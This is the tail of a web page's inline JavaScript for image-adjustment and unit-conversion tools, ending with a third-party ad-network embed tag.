                downloadBtn.style.display = 'none';
                outputArea.textContent = 'Upload an image to start.';
                originalImageForRepair = null;
            }
        }
        
        function applyImageFilters() {
            const canvas = document.getElementById('imageRepairCanvas');
            if (!originalImageForRepair || !canvas || !canvas.getContext) return;
            
            imageRepairCanvasCtx = canvas.getContext('2d'); // Ensure context is fresh if canvas was re-added
            const brightness = document.getElementById('brightnessSlider').value;
            const contrast = document.getElementById('contrastSlider').value;

            document.getElementById('brightnessValue').textContent = `${brightness}%`;
            document.getElementById('contrastValue').textContent = `${contrast}%`;

            imageRepairCanvasCtx.filter = `brightness(${brightness}%) contrast(${contrast}%)`;
            imageRepairCanvasCtx.drawImage(originalImageForRepair, 0, 0, canvas.width, canvas.height);
        }

        function resetImageFilters() {
            if (!originalImageForRepair) return;
            document.getElementById('brightnessSlider').value = 100;
            document.getElementById('contrastSlider').value = 100;
            applyImageFilters();
        }

        function downloadRepairedImage() {
            const canvas = document.getElementById('imageRepairCanvas');
            if (!canvas || canvas.style.display === 'none') return;
            const imageURL = canvas.toDataURL('image/png');
            const link = document.createElement('a');
            link.href = imageURL;
            link.download = 'repaired_image.png';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }


        // Unit Converter
        function populateUnitDropdowns() {
            const category = document.getElementById('unitCategory').value;
            const fromUnitSelect = document.getElementById('fromUnit');
            const toUnitSelect = document.getElementById('toUnit');
            
            fromUnitSelect.innerHTML = '';
            toUnitSelect.innerHTML = '';

            const units = convert().list(category);
            units.forEach(unit => {
                fromUnitSelect.add(new Option(unit.plural, unit.abbr));
                toUnitSelect.add(new Option(unit.plural, unit.abbr));
            });

            if (units.length > 1) { // Auto select different from/to if possible
                 fromUnitSelect.selectedIndex = 0;
                 toUnitSelect.selectedIndex = 1;
            } else if (units.length === 1) {
                 fromUnitSelect.selectedIndex = 0;
                 toUnitSelect.selectedIndex = 0;
            }
            convertUnits(); // Perform initial conversion
        }

        function convertUnits() {
            const fromValue = parseFloat(document.getElementById('fromUnitValue').value);
            const fromUnit = document.getElementById('fromUnit').value;
            const toUnit = document.getElementById('toUnit').value;
            const toUnitValueInput = document.getElementById('toUnitValue');
            const outputArea = document.getElementById('unitConverterOutput');

            if (isNaN(fromValue) || !fromUnit || !toUnit) {
                toUnitValueInput.value = '';
                outputArea.textContent = 'Please enter a valid number and select units.';
                return;
            }

            try {
                const result = convert(fromValue).from(fromUnit).to(toUnit);
                toUnitValueInput.value = result.toFixed(5); // Adjust precision as needed
                outputArea.textContent = `${fromValue} ${document.getElementById('fromUnit').options[document.getElementById('fromUnit').selectedIndex].text} = ${result.toFixed(5)} ${document.getElementById('toUnit').options[document.getElementById('toUnit').selectedIndex].text}`;
            } catch (error) {
                toUnitValueInput.value = 'Error';
                outputArea.textContent = 'Conversion not possible or error occurred.';
                console.error("Conversion error:", error);
            }
        }

        // Helper for camera file handling (since FileList is read-only)
        // This won't truly set input.files but can be used to pass a File object
        function createFileList(file) {
            const dataTransfer = new DataTransfer();
            dataTransfer.items.add(file);
            return dataTransfer.files;
        }

        // Initial state: no tool selected
        clearToolContainer();
        // Optionally select a default tool
        // document.querySelector('.tool-button[data-tool="imageToText"]').click();

    }); // End DOMContentLoaded
</script>
<ins style="width: 300px;height:250px" data-width="300" data-height="250" class="t8a4d293a0e" data-domain="//poqc4.sbs" data-affquery="/7eb765a95d5a7d1304be/8a4d293a0e/?placementName=default"><script src="//poqc4.sbs/js/responsive.js" async></script></ins>
</body>
</html>
